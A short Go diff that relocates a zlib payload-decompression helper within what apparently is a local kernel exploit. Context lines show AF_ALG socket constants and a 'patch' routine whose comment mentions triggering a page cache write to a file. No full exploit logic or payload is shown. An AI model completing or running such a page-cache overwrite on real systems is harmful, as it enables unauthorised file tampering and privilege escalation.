@@ -26,6 +26,20 @@ const (
     ALG_SET_AEAD_AUTHSIZE = 5
 )
 
+// Decompresses hex payload
+func decompressPayload(zlibBytes []byte) []byte {
+    r, err := zlib.NewReader(bytes.NewReader(zlibBytes))
+    if err != nil {
+        log.Fatalf("Zlib decompression failed: %v", err)
+    }
+    payload, err := io.ReadAll(r)
+    r.Close()
+    if err != nil {
+        log.Fatalf("Read zlib payload: %v", err)
+    }
+    return payload
+}
+
 // Builds control message (cmsg) buffer to be sent with payload
 func buildCmsg(level, typ int, data []byte) []byte {
     cmsgSpace := unix.CmsgSpace(len(data))
@@ -116,19 +130,6 @@ func patch(f *os.File, t int, cData []byte) {
     //9) Consume response, triggering page cache write
     buf := make([]byte, 8+t)
     unix.Read(uFd, buf)
-}
-
-func decompressPayload(zlibBytes []byte) []byte {
-    r, err := zlib.NewReader(bytes.NewReader(zlibBytes))
-    if err != nil {
-        log.Fatalf("Zlib decompression failed: %v", err)
-    }
-    payload, err := io.ReadAll(r)
-    r.Close()
-    if err != nil {
-        log.Fatalf("Read zlib payload: %v", err)
-    }
-    return payload
 }
 
 func main() {
